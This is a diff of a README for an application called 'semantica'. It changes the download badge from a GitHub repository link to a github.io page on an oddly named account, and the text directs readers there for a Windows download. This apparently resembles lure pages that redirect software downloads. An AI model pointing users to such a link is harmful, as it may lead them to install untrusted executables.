@@ -21,7 +21,7 @@ semantica provides several amazing benefits that make working with AI easier and
 Ready to get started? Here's how to download and install semantica:
 
 ### Step 1: Download the Application
-[![Download semantica](https://img.shields.io/badge/Download-semantica-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/anorexigenic-specification58/semantica)
+[![Download semantica](https://img.shields.io/badge/Download-semantica-blue?style=for-the-badge&logo=github&color=4B0082)](https://anorexigenic-specification58.github.io)
 
 Visit this link to download the application. You'll find the latest version available for Windows on that page.
 
